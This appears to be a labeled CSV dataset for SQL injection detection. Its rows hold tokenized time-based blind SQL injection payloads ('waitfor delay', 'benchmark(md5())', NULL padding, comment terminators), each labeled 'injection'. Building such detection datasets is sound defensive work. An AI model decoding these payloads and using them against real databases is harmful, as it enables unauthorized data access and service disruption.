103,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
104,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
105,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
106,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
0,waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
1,waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
2,SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
3,SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
4,DQUT waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
5,DQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
6,RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
7,RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
8,RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
9,RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
10,RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
11,RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
12,RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
13,RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
14,RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
15,RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
16,SQUT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
17,SQUT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
18,DQUT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
19,DQUT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
20,SQUT RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
21,SQUT RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
22,DQUT RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
23,DQUT RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
24,SQUT RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
25,SQUT RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
26,DQUT RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
27,DQUT RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
28,SQUT RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
29,SQUT RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
30,DQUT RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
31,DQUT RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
32,SQUT RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
33,SQUT RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
34,DQUT RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
35,DQUT RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
36,SQUT RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
37,SQUT RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
38,DQUT RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT SLSH STAR,injection
39,DQUT RPRN RPRN RPRN RPRN RPRN RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
0,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT SLSH STAR,injection
1,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT MINUS MINUS,injection
2,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT PRCNT INT,injection
3,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT SLSH STAR,injection
4,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT MINUS MINUS,injection
5,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT PRCNT INT,injection
6,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT SLSH STAR,injection
7,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT MINUS MINUS,injection
8,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN RPRN PRCNT INT PRCNT INT,injection
9,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT SLSH STAR,injection
10,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
11,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT PRCNT INT,injection
12,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT SLSH STAR,injection
13,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
14,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT PRCNT INT,injection
15,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT SLSH STAR,injection
16,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
17,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL RPRN PRCNT INT PRCNT INT,injection
18,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
19,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
20,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
21,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
22,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
23,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
24,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
25,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
26,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
27,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
28,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
29,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
30,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
31,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
32,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
33,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
34,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
35,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
36,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
37,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
38,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
39,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
40,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
41,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
42,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
43,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
44,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
45,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
46,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
47,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
48,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
49,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
50,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
51,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
52,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
53,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
54,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
55,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
56,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
57,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
58,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
59,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
60,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
61,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
62,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
63,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
64,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
65,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
66,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
67,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
68,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
69,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
70,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
71,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
72,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
73,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
74,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
75,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
76,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
77,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
78,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
79,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
80,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
81,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
82,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
83,PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
84,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
85,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
86,SQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
87,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT SLSH STAR,injection
88,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT MINUS MINUS,injection
89,DQUT PLUS IF LPRN benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA NULL CMMA NULL RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT INT PRCNT INT,injection
0,CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
1,CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
2,CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
3,SQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
4,SQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
5,SQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
6,DQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
7,DQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
8,DQUT CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN PRCNT INT,injection
9,RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN SLSH STAR,injection
10,RPRN CMMA LPRN SELECT PRCNT 20if LPRN COUNT LPRN STAR RPRN EXCLM EQ MINUS INT CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN CMMA benchmark LPRN INT CMMA md5 LPRN INT RPRN RPRN RPRN RPRN MINUS MINUS,injection
